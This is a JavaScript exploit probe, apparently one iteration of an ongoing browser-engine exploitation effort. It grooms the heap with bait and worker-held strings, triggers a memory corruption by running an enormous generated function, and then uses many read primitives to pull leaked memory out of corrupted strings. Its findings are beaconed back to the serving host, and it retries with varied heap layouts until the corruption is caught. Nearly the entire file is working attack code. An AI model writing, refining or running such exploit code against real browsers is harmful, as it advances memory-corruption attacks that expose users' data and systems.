// p169 — p156 exact pattern + multi-read extraction + auto-retry
//
// p168 proved: OOB only happens during EXECUTION, not compilation.
// p156 is the ONLY probe that survived the call and detected corruption.
// The survival is probabilistic (heap layout dependent).
//
// Strategy: run the proven p156 pattern with auto-retry (localStorage).
// Each attempt varies bait count slightly for different heap layouts.
// When corruption IS detected, fire every read primitive we have.
//
// Beacon prefix: V169-

(function() {
  var BASE = location.protocol + '//' + location.host;
  var sendQueue = [];
  var sending = false;

  function B(tag) {
    sendQueue.push(tag);
    if (!sending) drainQueue();
  }

  function drainQueue() {
    if (sendQueue.length === 0) { sending = false; return; }
    sending = true;
    var tag = sendQueue.shift();
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V169-' + tag + '?t=' + Date.now(), true);
      x.onloadend = function() { setTimeout(drainQueue, 20); };
      x.onerror = function() { setTimeout(drainQueue, 20); };
      x.send();
    } catch(e) { setTimeout(drainQueue, 20); }
  }

  function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  var attempt = 0;
  try {
    attempt = parseInt(localStorage.getItem('p169_att') || '0');
    localStorage.setItem('p169_att', '' + (attempt + 1));
  } catch(e) {}

  B('BOOT-A' + attempt);

  // ── WORKER ──
  var workerCode = function() {
    var targets = [];
    var baseUrl = '';
    var STR_LEN = 100000;

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('GET', baseUrl + '/beacon/V169-W-' + tag + '?t=' + Date.now(), true);
        x.send();
      } catch(e) {}
    }
    function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }
      if (e.data.cmd === 'alloc') {
        var chunk = '';
        for (var k = 0; k < 100; k++) chunk += 'AAAAAAAAAA';
        for (var i = 0; i < 14; i++) {
          var s = '';
          for (var j = 0; j < STR_LEN; j += 1000) s += chunk;
          s = s.substring(0, STR_LEN);
          s.charCodeAt(0);
          targets.push(s);
        }
        beacon('T-' + targets.length);
        self.postMessage({ ready: true });
        return;
      }
      if (e.data.cmd === 'watch') {
        beacon('WATCH');
        var found = -1;
        var iters = 0;

        while (found < 0) {
          for (var i = 0; i < targets.length; i++) {
            if (targets[i].length !== STR_LEN) {
              found = i;
              break;
            }
          }
          iters++;
          if (iters % 1000000 === 0) beacon('P-' + iters);
          if (iters > 200000000) { beacon('GIVEUP'); return; }
        }

        beacon('HIT-' + found + '-len=' + targets[found].length);

        // All lengths
        var lens = '';
        for (var i = 0; i < targets.length; i++) lens += targets[i].length + ',';
        beacon('LENS-' + lens);

        // Extract from each corrupted string
        for (var i = 0; i < targets.length; i++) {
          var len = targets[i].length;
          if (len === STR_LEN) continue;

          beacon('C' + i + '-0x' + len.toString(16));

          // charCodeAt scan — extended to 200 bytes
          var cc = '';
          var scanMax = Math.min(len, 200);
          for (var b = 0; b < scanMax; b++) {
            try {
              var ch = targets[i].charCodeAt(b);
              if (ch !== 0x41) cc += b + ':' + hx(ch) + ',';
            } catch(e) { cc += b + ':E,'; break; }
          }
          beacon('CC' + i + '-' + (cc || 'ALL41').substring(0, 200));

          // codePointAt
          try {
            var cp = '';
            for (var b = 0; b < 8; b++) cp += targets[i].codePointAt(b) + ',';
            beacon('CP' + i + '-' + cp);
          } catch(e) { beacon('CP' + i + '-E'); }

          // normalize
          try {
            var norm = targets[i].substring(0, 16).normalize('NFC');
            var nb = '';
            for (var b = 0; b < norm.length; b++) nb += hx(norm.charCodeAt(b));
            beacon('NR' + i + '-' + nb);
          } catch(e) { beacon('NR' + i + '-E-' + (e.message||'').substring(0,20)); }

          // TextEncoder
          try {
            var enc = new TextEncoder();
            var bytes = enc.encode(targets[i].substring(0, 32));
            var te = '';
            for (var b = 0; b < bytes.length; b++) te += hx(bytes[b]);
            beacon('TE' + i + '-' + te.substring(0, 200));
          } catch(e) { beacon('TE' + i + '-E'); }

          // btoa
          try {
            var b64 = btoa(targets[i].substring(0, 32));
            beacon('B6' + i + '-' + b64.substring(0, 80));
          } catch(e) { beacon('B6' + i + '-E-' + (e.message||'').substring(0,20)); }

          // indexOf
          try {
            var nul = targets[i].indexOf('\x00');
            var ff = targets[i].indexOf('\xff');
            beacon('IX' + i + '-n=' + nul + '-f=' + ff);
          } catch(e) { beacon('IX' + i + '-E'); }

          // split first 8 chars
          try {
            var spl = targets[i].substring(0, 8).split('');
            var sb = '';
            for (var b = 0; b < spl.length; b++) sb += hx(spl[b].charCodeAt(0));
            beacon('SP' + i + '-' + sb);
          } catch(e) { beacon('SP' + i + '-E'); }

          // regex non-A
          try {
            var m = targets[i].substring(0, 64).match(/[^\x41]/);
            if (m) beacon('RX' + i + '-' + m.index + ':' + hx(m[0].charCodeAt(0)));
            else beacon('RX' + i + '-allA');
          } catch(e) { beacon('RX' + i + '-E'); }

          // structuredClone
          try {
            var cl = structuredClone(targets[i].substring(0, 32));
            var cs = '';
            for (var b = 0; b < cl.length; b++) cs += hx(cl.charCodeAt(b));
            beacon('CL' + i + '-' + cs.substring(0, 200));
          } catch(e) { beacon('CL' + i + '-E-' + (e.message||'').substring(0,20)); }

          // struct offsets
          if (len > 112) {
            var st = '';
            var off = [0,4,8,12,16,20,24,28,32,48,56,64,68,72,80,96,104,108,112];
            for (var oi = 0; oi < off.length; oi++) {
              try { st += off[oi] + ':' + hx(targets[i].charCodeAt(off[oi])) + ','; }
              catch(e) { st += off[oi] + ':E,'; }
            }
            beacon('ST' + i + '-' + st.substring(0, 200));
          }

          // rawlen
          var b0 = len & 0xFF, b1 = (len>>8) & 0xFF;
          var b2 = (len>>16) & 0xFF, b3 = (len>>24) & 0xFF;
          beacon('RL' + i + '-' + hx(b3) + hx(b2) + hx(b1) + hx(b0));

          if (i >= 2) break;
        }
        beacon('DONE');
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var worker = new Worker(URL.createObjectURL(workerBlob));
  worker.postMessage({ cmd: 'init', baseUrl: BASE });

  // ── BAITS — vary by attempt ──
  var N_BAIT = 20 + (attempt % 5) * 2;
  var STR_LEN = 100000;
  B('BAIT-N' + N_BAIT);
  var baits = [];
  var baitChunk = '';
  for (var k = 0; k < 100; k++) baitChunk += 'BBBBBBBBBB';
  for (var i = 0; i < N_BAIT; i++) {
    var bait = '';
    for (var j = 0; j < STR_LEN; j += 1000) bait += baitChunk;
    bait = bait.substring(0, STR_LEN);
    bait.charCodeAt(0);
    baits.push(bait);
  }
  baitChunk = null;
  B('BAIT-OK');

  // ── WORKER TARGETS ──
  worker.onmessage = function(e) {
    if (e.data.ready) doFreeAndGC();
  };
  worker.postMessage({ cmd: 'alloc' });

  function doFreeAndGC() {
    for (var i = 0; i < baits.length; i++) baits[i] = null;
    baits = null;
    B('FREE');

    var gc = 0;
    function gcRound() {
      for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
      for (var j = 0; j < 500; j++) new Array(100).fill(gc);
      gc++;
      if (gc < 30) setTimeout(gcRound, 30);
      else { B('GC-OK'); doBuild(); }
    }
    gcRound();
  }

  function doBuild() {
    B('BUILD');
    var N = 38348816;
    var CHUNK = 4000000;
    var CHUNKS = Math.floor(N / CHUNK);
    var REM = N - CHUNKS * CHUNK;

    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < REM; r++) remChunk += 'a();';

    var parts = ['window.__v169=function(a){'];
    for (var ch = 0; ch < CHUNKS; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__v169ok=1;');

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + (blob.size / 1048576 | 0) + 'M');
    callChunk = null; remChunk = null; parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');

    sc.onload = function() {
      B('COMP-' + (window.__v169ok ? 'OK' : 'NO'));
      if (!window.__v169) { B('NOFN'); return; }

      // Start watching BEFORE calling (p156 pattern)
      worker.postMessage({ cmd: 'watch' });

      setTimeout(function() {
        B('CALL');
        try {
          window.__v169(function(){});
        } catch(ex) {
          B('EX-' + (ex.message || '').substring(0, 20));
        }
        B('ALIVE');
      }, 200);
    };

    sc.onerror = function() { B('SERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
